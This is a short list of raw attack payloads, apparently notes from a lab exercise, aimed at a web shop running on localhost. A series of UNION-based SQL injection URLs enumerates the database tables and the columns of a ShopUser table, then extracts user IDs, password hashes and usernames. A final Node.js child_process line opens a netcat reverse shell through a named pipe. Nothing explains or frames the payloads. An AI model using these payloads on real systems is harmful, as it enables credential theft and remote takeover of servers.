" order by itemStock --

http://localhost:3000/search?s=%22%20and%201=2%20UNION%20SELECT%201,%20table_name,%201,%201%20FROM%20information_schema.tables%20%20--%20

http://localhost:3000/search?s=%22%20and%201=2%20UNION%20SELECT%201,%20column_name,%201,%201%20FROM%20information_schema.columns%20where%20table_name%20=%22ShopUser%22%20%20--%20


http://localhost:3000/search?s=%22%20and%201=2%20UNION%20SELECT%20userID,%20userHash,%20userName,%201%20FROM%20ShopUser%20%20--%20



require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 127.0.0.1 1337 >/tmp/f')